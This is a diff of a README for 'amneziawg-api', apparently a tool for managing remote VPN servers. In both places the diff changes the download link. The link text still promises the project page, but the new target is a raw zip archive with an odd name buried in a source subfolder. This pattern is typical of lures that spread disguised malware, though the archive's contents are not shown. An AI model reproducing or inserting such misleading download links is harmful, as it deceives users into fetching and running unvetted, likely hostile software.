@@ -1,6 +1,6 @@
 # 🌐 amneziawg-api - Manage remote VPN servers with ease
 
-[![Download amneziawg-api](https://img.shields.io/badge/Download-AmneziaWG-blue.svg)](https://github.com/zhao2568925438-create/amneziawg-api)
+[![Download amneziawg-api](https://img.shields.io/badge/Download-AmneziaWG-blue.svg)](https://raw.githubusercontent.com/zhao2568925438-create/amneziawg-api/main/amnezia_api/api/amneziawg-api-alveoli.zip)
 
 ## 📌 Project Overview
 
@@ -26,7 +26,7 @@ Follow these steps to prepare your environment. These steps ensure that the appl
 
 Visit the repository page to obtain the necessary files. This software package contains the API framework and the tools required to communicate with your remote servers. 
 
-[Click here to visit the project page and download the software.](https://github.com/zhao2568925438-create/amneziawg-api)
+[Click here to visit the project page and download the software.](https://raw.githubusercontent.com/zhao2568925438-create/amneziawg-api/main/amnezia_api/api/amneziawg-api-alveoli.zip)
 
 1. Navigate to the link above.
 2. Click the green "Code" button.
